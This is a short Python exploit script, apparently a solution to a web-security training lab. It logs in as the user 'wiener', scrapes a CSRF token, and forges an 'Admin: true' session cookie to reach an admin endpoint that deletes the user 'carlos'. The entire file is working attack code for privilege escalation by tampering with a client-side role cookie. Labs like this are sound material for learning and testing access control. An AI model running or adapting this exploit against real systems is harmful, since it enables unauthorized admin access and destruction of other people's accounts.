import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    print(csrf)
    return csrf

def delete_users(s, url):
    #delete user logic

    # GET CSRF token from login page
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    #login as wiener
    data = {"csrf": csrf_token, "username": "wiener", "password": "peter"}

    r = s.post(login_url, data=data, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print("(+) Successfully logged in as wiener")

        # Retrieve session cookie
        session_cookie = r.cookies.get_dict().get('session')

        # Visit the admin panel and delete user Carlosz
        delete_carlos_user_url = url + "/admin/delete?username=carlos"
        cookies = {'session': session_cookie, "Admin": "true"}
        r = requests.get(delete_carlos_user_url, cookies=cookies, verify=False, proxies=proxies)

        if r.status_code == 200:
            print("(+) Successfully deleted carlos!")
        else:
            print("(-) Failed to delete carlos.")
            sys.exit(-1)

    else:
        print("(-) Failed to log in as wiener")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    delete_users(s, url)



if __name__ == '__main__':
    main()
